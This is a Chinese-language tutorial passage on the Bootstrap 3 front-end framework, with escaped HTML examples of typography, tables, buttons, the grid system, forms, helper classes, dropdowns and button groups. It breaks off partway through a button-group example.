Twitter（全国最大的微博），是目前最受欢迎的前端框架。 bootstrap下载及演示 http://v3.bootcss.com 什么是bootstrap？  Bootstrap是基于 HTML、CSS、JAVASCRIPT 的开源框架，它简洁、直观、强悍、灵活，使得 Web开发更加快捷， 用于开发响应式布局、移动设备优先的 WEB项目。  为什么使用 Bootstrap？  跨设备 跨浏览器（chrome，IE9以上，Firefox，Safari，Opera\u0026hellip;） 响应式布局 具有实用性强的组件 内置jquery插件  bootstrap的结构  主要分为三大核心模块：css、js、font   二、bootstrap排版样式  标题  从 h1 到 h6   \u0026lt;h1\u0026gt;Bootstrap 排版\u0026lt;/h1\u0026gt; //36px \u0026lt;h2\u0026gt;Bootstrap 排版\u0026lt;/h2\u0026gt; //30px \u0026lt;h3\u0026gt;Bootstrap 排版\u0026lt;/h3\u0026gt; //24px \u0026lt;h4\u0026gt;Bootstrap 排版\u0026lt;/h4\u0026gt; //18px \u0026lt;h5\u0026gt;Bootstrap 排版\u0026lt;/h5\u0026gt; //14px \u0026lt;h6\u0026gt;Bootstrap 排版\u0026lt;/h6\u0026gt; //12px \u0026lt;h2\u0026gt;bootstrap课程\u0026lt;/h2\u0026gt; \u0026lt;p class=\u0026quot;lead\u0026quot;\u0026gt;hello world\u0026lt;/p\u0026gt;   内联文本元素  添加标记，\u0026lt;mark\u0026gt;元素或.mark 类   \u0026lt;p\u0026gt;Bootstrap\u0026lt;mark\u0026gt;排版\u0026lt;/mark\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;!--各种加线条的文本--\u0026gt; \u0026lt;del\u0026gt;Bootstrap 排版\u0026lt;/del\u0026gt; //删除的文本 \u0026lt;s\u0026gt;Bootstrap 排版\u0026lt;/s\u0026gt; //无用的文本 \u0026lt;ins\u0026gt;Bootstrap 排版\u0026lt;/ins\u0026gt; //插入的文本 \u0026lt;u\u0026gt;Bootstrap 排版\u0026lt;/u\u0026gt; //效果同上，下划线文本 \u0026lt;!--各种强调的文本--\u0026gt; \u0026lt;small\u0026gt;Bootstrap 排版\u0026lt;/small\u0026gt; //标准字号的 85% \u0026lt;strong\u0026gt;Bootstrap 排版\u0026lt;/strong\u0026gt; //加粗 700 \u0026lt;em\u0026gt;Bootstrap 排版\u0026lt;/em\u0026gt; //倾斜 \u0026lt;p class=\u0026quot;text-left\u0026quot;\u0026gt;向左对齐文本\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026quot;text-center\u0026quot;\u0026gt;居中对齐文本\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026quot;text-right\u0026quot;\u0026gt;向右对齐文本\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026quot;text-justify\u0026quot;\u0026gt;对齐文本。该段落会根据屏幕的大小对超出屏幕的文字进行换行\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026quot;text-nowrap\u0026quot;\u0026gt;该段落不会根据屏幕的大小对超出屏幕的文字进行换行。\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026quot;text-lowercase\u0026quot;\u0026gt;BOOTSTROP\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026quot;text-uppercase\u0026quot;\u0026gt;bootstrap\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026quot;text-capitalize\u0026quot;\u0026gt;bootstrap\u0026lt;/p\u0026gt; //单词首字母大写   缩略语  HTML元素提供了用于缩写的标记，比如 WWW 或 HTTP。Bootstrap 定义 \u0026lt;abbr\u0026gt; 元素的样式为显示在文本底部的一条虚线边框 当鼠标悬停在上面时会显示完整的文本（只要您为 \u0026lt;abbr\u0026gt; title 属性添加了文本）。为了得到一个更小字体的文本， 请添加 .initialism 到 \u0026lt;abbr\u0026gt;    \u0026lt;abbr title=\u0026quot;World Wide Web\u0026quot;\u0026gt;WWW\u0026lt;/abbr\u0026gt;\u0026lt;br\u0026gt; \u0026lt;abbr title=\u0026quot;Real Simple Syndication\u0026quot; class=\u0026quot;initialism\u0026quot;\u0026gt;RSS\u0026lt;/abbr\u0026gt;   地址  address默认为 display:block;，需要使用标签来为封闭的地址文本添加换行    \u0026lt;address\u0026gt; \u0026lt;strong\u0026gt;Twitter, Inc.\u0026lt;/strong\u0026gt;\u0026lt;br\u0026gt; 795 Folsom Ave, Suite 600\u0026lt;br\u0026gt; San Francisco, CA 94107\u0026lt;br\u0026gt; \u0026lt;abbr title=\u0026quot;Phone\u0026quot;\u0026gt;P:\u0026lt;/abbr\u0026gt; (123) 456-7890 \u0026lt;/address\u0026gt; \u0026lt;address\u0026gt; \u0026lt;strong\u0026gt;Full Name\u0026lt;/strong\u0026gt;\u0026lt;br\u0026gt; \u0026lt;a href=\u0026quot;mailto:#\u0026quot;\u0026gt;first.last@example.com\u0026lt;/a\u0026gt; \u0026lt;/address\u0026gt;   引用  默认样式引用，增加了左边线，设定了字体大小和内外边距 \u0026lt;blockquote\u0026gt; Bootstrap 框架 \u0026lt;/blockquote\u0026gt; 反向 \u0026lt;blockquote class=\u0026quot;blockquote-reverse \u0026quot;\u0026gt; Bootstrap 框架 \u0026lt;/blockquote\u0026gt; 多种引用样式    \u0026lt;blockquote\u0026gt; \u0026lt;p\u0026gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer posuere erat a ante.\u0026lt;/p\u0026gt; \u0026lt;footer class=\u0026quot;text-right\u0026quot;\u0026gt;Someone famous in \u0026lt;cite title=\u0026quot;Source Title\u0026quot;\u0026gt;Source Title\u0026lt;/cite\u0026gt;\u0026lt;/footer\u0026gt; \u0026lt;/blockquote\u0026gt;   列表\n 有序列表、无序列表、自定义列表  .list-unstyled .list-inline .dl-horizontal 应用于\u0026lt;dl\u0026gt;元素和\u0026lt;dt\u0026gt;元素中    代码\n .pre-scrollable 使 \u0026lt;pre\u0026gt; 元素可滚动 scrollable 内联代码 \u0026lt;code\u0026gt;\u0026lt;section\u0026gt;\u0026lt;/code\u0026gt; 用户输入 press \u0026lt;kbd\u0026gt;ctrl + ,\u0026lt;/kbd\u0026gt; 标记变量 \u0026lt;var\u0026gt;y\u0026lt;/var\u0026gt; = \u0026lt;var\u0026gt;m\u0026lt;/var\u0026gt;\u0026lt;var\u0026gt;x\u0026lt;/var\u0026gt; + \u0026lt;var\u0026gt;b\u0026lt;/var\u0026gt; 程序输出 \u0026lt;samp\u0026gt;This text is meant to be treated as sample output from a computer program.\u0026lt;/samp\u0026gt; 代码块 \u0026lt;pre\u0026gt;\u0026lt;article\u0026gt;Please input...\u0026lt;/article\u0026gt;\u0026lt;/pre\u0026gt;   三、表格、按钮、图片  表格\n 基本表格 \u0026lt;table class=\u0026quot;table\u0026quot;\u0026gt; 条纹表格 \u0026lt;table class=\u0026quot;table table-striped\u0026quot;\u0026gt; 边框表格 \u0026lt;table class=\u0026quot;table table-bordered\u0026quot;\u0026gt; 悬停表格\u0026lt;table class=\u0026quot;table table-hover\u0026quot;\u0026gt; 精简表格\u0026lt;table class=\u0026quot;table table-condensed\u0026quot;\u0026gt; 状态表格active、success、info、warning、danger 隐藏某一行\u0026lt;tr class=\u0026quot;sr-only\u0026quot;\u0026gt; 响应式表格  表格父元素设置响应式，小于 768px 出现边框 \u0026lt;div class=\u0026quot;table-responsive\u0026quot;\u0026gt;   按钮\n 按钮标签  转化成普通按钮 \u0026lt;a href=\u0026quot;###\u0026quot; class=\u0026quot;btn btn-default\u0026quot;\u0026gt;Link\u0026lt;/a\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;Button\u0026lt;/button\u0026gt; \u0026lt;input type=\u0026quot;button\u0026quot; class=\u0026quot;btn btn-default\u0026quot; value=\u0026quot;input\u0026quot;\u0026gt; 注意：为了跨浏览器展现，尽量使用button  按钮大小  .btn-lg 这会让按钮看起来比较大。 .btn-sm 这会让按钮看起来比较小。 .btn-xs 这会让按钮看起来特别小。  预定义样式  .btn-default 默认/标准按钮 .btn-primary 首选项样式 .btn-success 成功样式 .btn-info一般信息样式 .btn-warning 警告样式 .btn-danger 危险样式 .btn-link 链接样式  块级按钮  .btn-block 块级按钮(拉伸至父元素100%的宽度)  激活状态  \u0026lt;button class=\u0026quot;btn active\u0026quot;\u0026gt;Button\u0026lt;/button\u0026gt;  禁用状态  \u0026lt;button class=\u0026quot;btn active disabled\u0026quot;\u0026gt;Button\u0026lt;/button\u0026gt;   图片\n .img-rounded 圆角 (IE8 不支持) .img-circle 圆形 (IE8 不支持) .img-thumbnail 缩略图功能 .img-responsive 图片响应式 (将很好地扩展到父元素)   四、栅格系统、表单  栅格系统\n 响应式网格系统随着屏幕或视口（viewport）尺寸的增加，系统会自动分为最多12列。 工作原理  行必须放置在.container(固定宽度)或者.container-fluid(100%宽度) class内，获得适当的对齐(alignment)和内边距(padding) 内容放置在列中，唯有列可以是行的直接子元素 预定义的网格类，比如 .row 和 .col-lg-4，可用于快速创建网格布局 列通过内边距（padding）来创建列内容之间的间隙  媒体查询  超小设备（手机，小于 768px） 没有任何媒体查询相关的代码，因为这在 Bootstrap 中是默认的（还记得 Bootstrap 是移动设备优先的吗？） 小型设备（平板电脑，大于等于768px）@media (min-width: @screen-sm-min) and (max-width: @screen-sm-max) { ... } 中型设备（台式电脑，大于等于992px）@media (min-width: @screen-md-min) and (max-width: @screen-md-max) { ... } 大型设备（大台式电脑，大于等于1200px）@media (min-width: @screen-lg-min) { ... }  栅格参数\n 超小屏幕 手机 (\u0026lt;768px)\n 小屏幕 平板 (≥768px)\n 中等屏幕 桌面显示器 (≥992px)\n 大屏幕 大桌面显示器 (≥1200px) 栅格系统行为\n 总是水平排列 开始是堆叠在一起的，当大于这些阈值时将变为水平排列C .container 最大宽度 None（自动）750px 970px 1170px 类前缀 .col-xs- .col-sm- .col-md- .col-lg- 列（column）数 12 最大列（column）宽 自动 ~62px ~81px ~97px 间隙宽度 30px （每列左右均有 15px）  四种屏幕分类全部激活\n\u0026lt;div class=\u0026quot;container\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;row\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;col-lg-3 col-md-4 col-sm-6 col-xs-12 a\u0026quot;\u0026gt;4\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;col-lg-3 col-md-4 col-sm-6 col-xs-12 a\u0026quot;\u0026gt;4\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;col-lg-3 col-md-4 col-sm-6 col-xs-12 a\u0026quot;\u0026gt;4\u0026lt;/div\u0026gt; .... \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;   可以设置列偏移，让中间保持空隙\n\u0026lt;div class=\u0026quot;container\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;row\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;col-md-8\u0026quot;\u0026gt;1-8\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;col-md-3 col-md-offset-1\u0026quot;\u0026gt;10-12\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;  可以嵌套，嵌满也是 12 列\n\u0026lt;div class=\u0026quot;container\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;row\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;col-md-9\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;col-md-8\u0026quot;\u0026gt;1-8\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;col-md-4\u0026quot;\u0026gt;9-12\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;col-md-3\u0026quot;\u0026gt; 10-12 \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;  可以把两个列交换位置，push 向右移动（推），pull 向左移动（拉）\n\u0026lt;div class=\u0026quot;container\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;row\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;col-md-8 col-md-push-4\u0026quot;\u0026gt;8\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;col-md-4 col-md-pull-8\u0026quot;\u0026gt;4\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;  表单\n 垂直或基本表单 内联表单 让表单左对齐浮动，并表现为 inline-block内联块结构\u0026lt;form class=\u0026quot;form-inline\u0026quot;\u0026gt; 注：当小于 768px，会恢复独占样式 水平表单 让表单内的元素保持水平排列 表单组合 前后增加片段 html \u0026lt;div class=\u0026quot;input-group\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;input-group-addon\u0026quot;\u0026gt;￥\u0026lt;/div\u0026gt; \u0026lt;input type=\u0026quot;text\u0026quot; class=\u0026quot;form-control\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;input-group-addon\u0026quot;\u0026gt;.00\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;   输入框、文本域\n 原生的HTML5的input类型的支持 包括：  text password datetime datetime-local date month time week number email url search tel color  \u0026lt;input type=\u0026quot;text\u0026quot; class=\u0026quot;form-control\u0026quot; placeholder=\u0026quot;文本输入\u0026quot;\u0026gt; \u0026lt;textarea class=\u0026quot;form-control\u0026quot; rows=\u0026quot;3\u0026quot;\u0026gt;\u0026lt;/textarea\u0026gt; 复选框（Checkbox）和单选框（Radio） html \u0026lt;div class=\u0026quot;checkbox\u0026quot;\u0026gt; \u0026lt;label\u0026gt;\u0026lt;input type=\u0026quot;checkbox\u0026quot; value=\u0026quot;\u0026quot;\u0026gt;选项 1\u0026lt;/label\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;radio\u0026quot;\u0026gt; \u0026lt;label\u0026gt; \u0026lt;input type=\u0026quot;radio\u0026quot; name=\u0026quot;optionsRadios\u0026quot; id=\u0026quot;optionsRadios1\u0026quot; value=\u0026quot;option1\u0026quot; checked\u0026gt; 选项 1 \u0026lt;/label\u0026gt; \u0026lt;/div\u0026gt;   内联的复选框和单选框\n\u0026lt;label class=\u0026quot;checkbox-inline\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;checkbox\u0026quot; id=\u0026quot;inlineCheckbox1\u0026quot; value=\u0026quot;option1\u0026quot;\u0026gt; 选项 1 \u0026lt;/label\u0026gt; \u0026lt;label class=\u0026quot;radio-inline\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;radio\u0026quot; id=\u0026quot;optionsRadiosinline\u0026quot; value=\u0026quot;option1\u0026quot;\u0026gt; 选项 1 \u0026lt;/label\u0026gt;  选择框 multiple多行显示\n\u0026lt;select class=\u0026quot;form-control\u0026quot; multiple\u0026gt; \u0026lt;option\u0026gt;1\u0026lt;/option\u0026gt; \u0026lt;option\u0026gt;2\u0026lt;/option\u0026gt; \u0026lt;option\u0026gt;3\u0026lt;/option\u0026gt; \u0026lt;option\u0026gt;4\u0026lt;/option\u0026gt; \u0026lt;option\u0026gt;5\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt;  静态控件 .form-control-static\n 表单控件状态\n 输入框焦点 当输入框 input 接收到:focus 时，输入框的轮廓会被移除，同时应用 box-shadow。 禁用的输入框 input 如果您想要禁用一个输入框 input，只需要简单地添加 disabled 属性，这不仅会禁用输入框，还会改变输入框的样式以及当鼠标的指针悬停在元素上时鼠标指针的样式。 禁用的字段集 fieldset 对 \u0026lt;fieldset\u0026gt; 添加 disabled 属性来禁用\u0026lt;fieldset\u0026gt; 内的所有控件。 校验状态  .has-warning、.has-error 或 .has-success 类到这些控件的父元素即可。  任何包含在此元素之内的 .control-label、.form-control 和 .help-block 元素都将接受这些校验状态的样式。  表单帮助文本\n\u0026lt;form role=\u0026quot;form\u0026quot;\u0026gt; \u0026lt;input class=\u0026quot;form-control\u0026quot; type=\u0026quot;text\u0026quot; placeholder=\u0026quot;\u0026quot;\u0026gt; \u0026lt;span class=\u0026quot;help-block\u0026quot;\u0026gt;一个较长的帮助文本块，超过一行，需要扩展到下一行。本实例中的帮助文本总共有两行。\u0026lt;/span\u0026gt; \u0026lt;/form\u0026gt;  控件尺寸\n .input-lg和col-lg-*来设置表单的高度和宽度 html \u0026lt;div class=\u0026quot;form-group\u0026quot;\u0026gt; \u0026lt;input class=\u0026quot;form-control input-lg\u0026quot; type=\u0026quot;text\u0026quot; placeholder=\u0026quot;input-lg\u0026quot;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;row\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;col-lg-2\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;text\u0026quot; class=\u0026quot;form-control\u0026quot; placeholder=\u0026quot;col-lg-2\u0026quot;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;col-lg-3\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;text\u0026quot; class=\u0026quot;form-control\u0026quot; placeholder=\u0026quot;col-lg-3\u0026quot;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;col-lg-4\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;text\u0026quot; class=\u0026quot;form-control\u0026quot; placeholder=\u0026quot;col-lg-4\u0026quot;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;    五、辅助类、响应式工具、菜单、图标 辅助类  文本  \u0026lt;p class=\u0026quot;text-muted\u0026quot;\u0026gt;本行内容是减弱的\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026quot;text-primary\u0026quot;\u0026gt;本行内容带有一个 primary class\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026quot;text-success\u0026quot;\u0026gt;本行内容带有一个 success class\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026quot;text-info\u0026quot;\u0026gt;本行内容带有一个 info class\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026quot;text-warning\u0026quot;\u0026gt;本行内容带有一个 warning class\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026quot;text-danger\u0026quot;\u0026gt;本行内容带有一个 danger class\u0026lt;/p\u0026gt;   背景  \u0026lt;p class=\u0026quot;bg-primary\u0026quot;\u0026gt;bootstrap课程\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026quot;bg-success\u0026quot;\u0026gt;bootstrap课程\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026quot;bg-info\u0026quot;\u0026gt;bootstrap课程\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026quot;bg-warning\u0026quot;\u0026gt;bootstrap课程\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026quot;bg-danger\u0026quot;\u0026gt;bootstrap课程\u0026lt;/p\u0026gt;   关闭按钮 close  \u0026lt;button class=\u0026quot;close\u0026quot;\u0026gt;×\u0026lt;/button\u0026gt;   下拉式菜单 caret  \u0026lt;span class=\u0026quot;caret\u0026quot;\u0026gt;\u0026lt;/span\u0026gt;   浮动 pull-left pull-right  \u0026lt;div class=\u0026quot;pull-left\u0026quot;\u0026gt;向左快速浮动\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;pull-right\u0026quot;\u0026gt;向右快速浮动\u0026lt;/div\u0026gt;   清除浮动 clearfix  \u0026lt;div class=\u0026quot;clearfix\u0026quot; style=\u0026quot;background: #D8D8D8;border: 1px solid #000;padding: 10px;\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;pull-left\u0026quot; style=\u0026quot;background:#58D3F7;\u0026quot;\u0026gt;向左快速浮动\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;pull-right\u0026quot; style=\u0026quot;background: #DA81F5;\u0026quot;\u0026gt;向右快速浮动\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;   块级内容居中 center-block  \u0026lt;div class=\u0026quot;row\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;center-block\u0026quot; style=\u0026quot;width:200px;background-color:#ccc;\u0026quot;\u0026gt; 这是 center-block \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;   显示、隐藏 show hide  \u0026lt;div class=\u0026quot;row\u0026quot; style=\u0026quot;padding: 91px 100px 19px 50px;\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;show\u0026quot; style=\u0026quot;width:300px;background-color:#ccc;\u0026quot;\u0026gt; 这是 show class \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;hidden\u0026quot; style=\u0026quot;width:200px;background-color:#ccc;\u0026quot;\u0026gt; 这是 hide class \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;   屏幕阅读器和键盘导航 .sr-only 来把元素对所有设备隐藏，除了屏幕阅读器 .sr-only-focusable  \u0026lt;div class=\u0026quot;row\u0026quot; style=\u0026quot;padding: 91px 100px 19px 50px;\u0026quot;\u0026gt; \u0026lt;form class=\u0026quot;form-inline\u0026quot; role=\u0026quot;form\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;form-group\u0026quot;\u0026gt; \u0026lt;label class=\u0026quot;sr-only\u0026quot; for=\u0026quot;email\u0026quot;\u0026gt;Email 地址\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026quot;email\u0026quot; class=\u0026quot;form-control\u0026quot; placeholder=\u0026quot;Enter email\u0026quot;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;form-group\u0026quot;\u0026gt; \u0026lt;label class=\u0026quot;sr-only\u0026quot; for=\u0026quot;pass\u0026quot;\u0026gt;密码\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026quot;password\u0026quot; class=\u0026quot;form-control\u0026quot; placeholder=\u0026quot;Password\u0026quot;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;a class=\u0026quot;sr-only sr-only-focusable\u0026quot; href=\u0026quot;#content\u0026quot;\u0026gt;Skip to main content\u0026lt;/a\u0026gt;  响应式工具\n visible-xs visible-sm visible-md visible-lg hidden-xs hidden-sm hidden-md hidden-lg 以超小屏幕（xs）为例，可用的 .visible-*-* 类是：visible-xs-block、visible-xs-inline 和 visible-xs-inline-block visible-print-block visible-print-inline visible-print-inline-block 浏览器隐藏 打印机可见 hidden-print 浏览器可见 打印机隐藏 visible-print  \u0026lt;div class=\u0026quot;container\u0026quot; style=\u0026quot;padding: 40px;\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;row\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;col-xs-6 col-sm-3\u0026quot; style=\u0026quot;background-color: #dedef8;border:1px solid #000;\u0026quot;\u0026gt; \u0026lt;span class=\u0026quot;hidden-xs\u0026quot;\u0026gt;特别小型\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026quot;visible-xs\u0026quot;\u0026gt;✔ 在特别小型设备上可见\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;col-xs-6 col-sm-3\u0026quot; style=\u0026quot;background-color: #dedef8;border:1px solid #000;\u0026quot;\u0026gt; \u0026lt;span class=\u0026quot;hidden-sm\u0026quot;\u0026gt;小型\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026quot;visible-sm\u0026quot;\u0026gt;✔ 在小型设备上可见\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;col-xs-6 col-sm-3\u0026quot; style=\u0026quot;background-color: #dedef8;border:1px solid #000;\u0026quot;\u0026gt; \u0026lt;span class=\u0026quot;hidden-md\u0026quot;\u0026gt;中型\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026quot;visible-md\u0026quot;\u0026gt;✔ 在中型设备上可见\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;col-xs-6 col-sm-3\u0026quot; style=\u0026quot;background-color: #dedef8;border:1px solid #000;\u0026quot;\u0026gt; \u0026lt;span class=\u0026quot;hidden-lg\u0026quot;\u0026gt;大型\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026quot;visible-lg\u0026quot;\u0026gt;✔ 在大型设备上可见\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;   字体图标\n 用法：\u0026lt;span class=\u0026quot;glyphicon glyphicon-search\u0026quot;\u0026gt;\u0026lt;/span\u0026gt;  下拉菜单\n 基本的下拉菜单   \u0026lt;div class=\u0026quot;dropdown\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default dropdown-toggle\u0026quot; data-toggle=\u0026quot;dropdown\u0026quot;\u0026gt;Dropdown \u0026lt;span class=\u0026quot;caret\u0026quot;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/button\u0026gt; \u0026lt;ul class=\u0026quot;dropdown-menu\u0026quot;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Html\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Javascript\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;jQuery\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;html5+css3\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt;   对齐 dropdown-menu-right  \u0026lt;ul class=\u0026quot;dropdown-menu\u0026quot;\u0026gt; ... \u0026lt;li class=\u0026quot;dropdown-header\u0026quot;\u0026gt;Dropdown header\u0026lt;/li\u0026gt; ... \u0026lt;/ul\u0026gt;   分隔线  \u0026lt;ul class=\u0026quot;dropdown-menu\u0026quot;\u0026gt; ... \u0026lt;li class=\u0026quot;divider\u0026quot;\u0026gt;\u0026lt;/li\u0026gt; ... \u0026lt;/ul\u0026gt;   禁用的菜单项  \u0026lt;ul class=\u0026quot;dropdown-menu\u0026quot; aria-labelledby=\u0026quot;dropdownMenu4\u0026quot;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;#\u0026quot;\u0026gt;Regular link\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026quot;disabled\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;#\u0026quot;\u0026gt;Disabled link\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;#\u0026quot;\u0026gt;Another link\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt;   让菜单默认显示 \u0026lt;div class=\u0026quot;dropdown open\u0026quot;\u0026gt;  六、按钮、输入框组件 按钮组件  基本的按钮组  \u0026lt;div class=\u0026quot;btn-group\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;left\u0026lt;/button\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;middle\u0026lt;/button\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;right\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt;   按钮工具栏  \u0026lt;div class=\u0026quot;btn-toolbar\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;btn-group\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;left\u0026lt;/button\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;middle\u0026lt;/button\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;right\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;btn-group\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;left\u0026lt;/button\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;middle\u0026lt;/button\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;right\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;btn-group\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;更多\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;   按钮的大小  \u0026lt;div class=\u0026quot;btn-group btn-group-lg\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;left\u0026lt;/button\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;middle\u0026lt;/button\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;right\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;btn-group btn-group-sm\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;left\u0026lt;/button\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;middle\u0026lt;/button\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;right\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;btn-group btn-group-xs\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;left\u0026lt;/button\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;middle\u0026lt;/button\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;right\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt;   嵌套  \u0026lt;div class=\u0026quot;btn-group\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;btn 